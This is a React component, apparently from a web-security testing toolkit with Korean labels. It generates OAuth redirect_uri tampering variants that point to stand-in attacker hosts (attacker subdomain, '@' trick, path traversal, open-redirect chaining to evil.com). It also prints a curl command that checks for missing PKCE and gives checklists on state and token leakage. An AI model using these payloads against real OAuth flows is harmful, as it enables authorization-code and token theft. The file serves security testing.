import { useState } from 'react'
import { DISCLAIMER, Note, Readout, TextInput } from './shared'

export function OAuthSsoBuilder() {
  const [url, setUrl] = useState('')
  const trimmed = url.trim()
  const base = trimmed || 'https://auth.example.com/authorize?client_id=123&response_type=code&redirect_uri=https://app.example.com/callback'

  const getRedirectVariants = (u: string) => {
    try {
      const parsed = new URL(u)
      const hostname = parsed.hostname
      const domain = hostname.split('.').slice(-2).join('.')

      const makeVariant = (newRedirect: string) => {
        const copy = new URL(u)
        copy.searchParams.set('redirect_uri', newRedirect)
        return copy.toString()
      }

      return [
        { label: '서브도메인 우회', value: makeVariant(`https://attacker.${domain}`) },
        { label: '@ 트릭', value: makeVariant('https://legit.com@evil.com') },
        { label: '경로 조작 (Path Traversal)', value: makeVariant('https://legit.com/callback/../../evil.com') },
        { label: '오픈 리다이렉트 체이닝', value: makeVariant('https://legit.com/callback?next=https://evil.com') },
      ]
    } catch {
      return [
        { label: '서브도메인 우회', value: base.replace('https://app.example.com/callback', 'https://attacker.example.com') },
        { label: '@ 트릭', value: base.replace('https://app.example.com/callback', 'https://legit.com@evil.com') },
        { label: '경로 조작', value: base.replace('https://app.example.com/callback', 'https://legit.com/callback/../../evil.com') },
        { label: '오픈 리다이렉트 체이닝', value: base.replace('https://app.example.com/callback', 'https://legit.com/callback?next=https://evil.com') },
      ]
    }
  }

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="OAuth Authorize URL" value={url} onChange={setUrl} placeholder="https://auth.example.com/authorize?..." />
      
      <div className="payload-readout-group">
        <strong className="payload-group-title">redirect_uri 변조 변형</strong>
        {getRedirectVariants(base).map((v, i) => (
          <Readout key={i} title={v.label} value={v.value} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">보안 점검 체크리스트</strong>
        <Note><strong>state 파라미터 점검:</strong></Note>
        <ul style={{ fontSize: '12px', color: '#6f6977', marginBottom: '12px' }}>
          <li>state 파라미터가 누락되었는가?</li>
          <li>고정된 state 값(예: 1234)을 사용하거나 재사용 가능한가?</li>
          <li>state 값의 무작위성이 부족한가?</li>
        </ul>
        
        <Note><strong>PKCE 누락 체크:</strong></Note>
        <Readout
          title="Code-to-Token 교환 (PKCE 없이 시도)"
          value={`curl -X POST https://auth.example.com/token -d "grant_type=authorization_code&code=<CODE>&client_id=<CLIENT_ID>&redirect_uri=<REDIRECT_URI>"`}
          wrap="anywhere"
        />
        <Note>code_verifier 없이 토큰 교환이 성공하면 PKCE가 강제되지 않은 것입니다.</Note>

        <Note><strong>토큰 유출 경로:</strong></Note>
        <ul style={{ fontSize: '12px', color: '#6f6977' }}>
          <li>Referer 헤더를 통해 외부 사이트로 access_token이 전달되는가?</li>
          <li>URL Fragment (#)에 토큰이 포함되어 브라우저 히스토리에 남는가?</li>
          <li>서버 로그(Access Log)에 토큰이 평문으로 기록되는가?</li>
        </ul>
      </div>
    </div>
  )
}

export default OAuthSsoBuilder
